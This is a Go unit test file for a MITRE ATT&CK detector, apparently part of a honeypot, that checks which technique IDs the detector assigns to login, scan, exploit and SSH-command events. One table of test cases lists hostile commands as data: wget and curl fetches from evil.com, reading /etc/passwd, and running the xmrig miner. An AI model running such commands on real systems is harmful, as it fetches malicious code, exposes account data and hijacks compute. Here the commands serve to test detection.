/*
©AngelaMos | 2026
detector_test.go
*/

package mitre

import (
	"encoding/json"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/CarterPerez-dev/hive/pkg/types"
)

func testEvent(
	et types.EventType, st types.ServiceType,
) *types.Event {
	return &types.Event{
		EventType:   et,
		ServiceType: st,
		SourceIP:    "203.0.113.1",
		Timestamp:   time.Now().UTC(),
	}
}

func testCommandEvent(cmd string) *types.Event {
	return &types.Event{
		EventType:   types.EventCommand,
		ServiceType: types.ServiceSSH,
		SourceIP:    "203.0.113.1",
		Timestamp:   time.Now().UTC(),
		ServiceData: json.RawMessage(
			`{"command":"` + cmd + `"}`,
		),
	}
}

func detectionIDs(
	dets []*types.MITREDetection,
) []string {
	ids := make([]string, len(dets))
	for i, d := range dets {
		ids[i] = d.TechniqueID
	}
	return ids
}

func TestLoginSuccessDetectsValidAccounts(t *testing.T) {
	d := NewDetector()
	ev := testEvent(
		types.EventLoginSuccess, types.ServiceHTTP,
	)

	dets := d.Detect(ev)
	ids := detectionIDs(dets)
	assert.Contains(t, ids, "T1078")
}

func TestSSHLoginDetectsRemoteService(t *testing.T) {
	d := NewDetector()
	ev := testEvent(
		types.EventLoginSuccess, types.ServiceSSH,
	)

	dets := d.Detect(ev)
	ids := detectionIDs(dets)
	assert.Contains(t, ids, "T1078")
	assert.Contains(t, ids, "T1021.004")
}

func TestCommandDetectsExecution(t *testing.T) {
	d := NewDetector()
	ev := testCommandEvent("ls")

	dets := d.Detect(ev)
	ids := detectionIDs(dets)
	assert.Contains(t, ids, "T1059.004")
}

func TestExploitDetectsInitialAccess(t *testing.T) {
	d := NewDetector()
	ev := testEvent(
		types.EventExploit, types.ServiceHTTP,
	)

	dets := d.Detect(ev)
	ids := detectionIDs(dets)
	assert.Contains(t, ids, "T1190")
}

func TestScanDetectsReconnaissance(t *testing.T) {
	d := NewDetector()
	ev := testEvent(
		types.EventScan, types.ServiceSSH,
	)

	dets := d.Detect(ev)
	ids := detectionIDs(dets)
	assert.Contains(t, ids, "T1595")
}

func TestCommandPatterns(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		wantID string
	}{
		{"wget triggers transfer", "wget http://evil.com/mal", "T1105"},
		{"curl triggers transfer", "curl http://evil.com/mal", "T1105"},
		{"crontab triggers persistence", "crontab -l", "T1053.003"},
		{"cat passwd triggers discovery", "cat /etc/passwd", "T1082"},
		{"ifconfig triggers network", "ifconfig", "T1016"},
		{"ps aux triggers process", "ps aux", "T1057"},
		{"ls triggers file discovery", "ls /etc", "T1083"},
		{"xmrig triggers cryptomining", "xmrig --donate-level 0", "T1496"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := NewDetector()
			ev := testCommandEvent(tt.cmd)
			dets := d.Detect(ev)
			ids := detectionIDs(dets)
			assert.Contains(t, ids, tt.wantID)
		})
	}
}

func TestBruteForceDetection(t *testing.T) {
	d := NewDetector()
	now := time.Now().UTC()

	for i := range 4 {
		ev := &types.Event{
			EventType:   types.EventLoginFailed,
			ServiceType: types.ServiceSSH,
			SourceIP:    "203.0.113.1",
			Timestamp: now.Add(
				time.Duration(i) * time.Second,
			),
		}
		dets := d.Detect(ev)
		ids := detectionIDs(dets)
		assert.NotContains(t, ids, "T1110")
	}

	fifth := &types.Event{
		EventType:   types.EventLoginFailed,
		ServiceType: types.ServiceSSH,
		SourceIP:    "203.0.113.1",
		Timestamp:   now.Add(4 * time.Second),
	}
	dets := d.Detect(fifth)
	ids := detectionIDs(dets)
	assert.Contains(t, ids, "T1110")
}

func TestBruteForceWindowExpiry(t *testing.T) {
	d := NewDetector()
	now := time.Now().UTC()

	for i := range 4 {
		ev := &types.Event{
			EventType:   types.EventLoginFailed,
			ServiceType: types.ServiceSSH,
			SourceIP:    "203.0.113.1",
			Timestamp: now.Add(
				time.Duration(i) * time.Second,
			),
		}
		d.Detect(ev)
	}

	stale := &types.Event{
		EventType:   types.EventLoginFailed,
		ServiceType: types.ServiceSSH,
		SourceIP:    "203.0.113.1",
		Timestamp:   now.Add(6 * time.Minute),
	}
	dets := d.Detect(stale)
	ids := detectionIDs(dets)
	assert.NotContains(t, ids, "T1110")
}

func TestServiceScanDetection(t *testing.T) {
	d := NewDetector()
	now := time.Now().UTC()

	services := []types.ServiceType{
		types.ServiceSSH,
		types.ServiceHTTP,
		types.ServiceFTP,
	}

	var lastDets []*types.MITREDetection
	for i, svc := range services {
		ev := &types.Event{
			EventType:   types.EventConnect,
			ServiceType: svc,
			SourceIP:    "203.0.113.1",
			Timestamp: now.Add(
				time.Duration(i) * time.Second,
			),
		}
		lastDets = d.Detect(ev)
	}

	ids := detectionIDs(lastDets)
	assert.Contains(t, ids, "T1046")
}

func TestDisconnectNoDetection(t *testing.T) {
	d := NewDetector()
	ev := testEvent(
		types.EventDisconnect, types.ServiceSSH,
	)

	dets := d.Detect(ev)
	assert.Empty(t, dets)
}

func TestDetectionsIncludeTactic(t *testing.T) {
	d := NewDetector()
	ev := testEvent(
		types.EventExploit, types.ServiceHTTP,
	)

	dets := d.Detect(ev)
	require.NotEmpty(t, dets)

	for _, det := range dets {
		if det.TechniqueID == "T1190" {
			assert.NotEmpty(t, det.Tactic)
			return
		}
	}
	t.Fatal("expected T1190 detection")
}
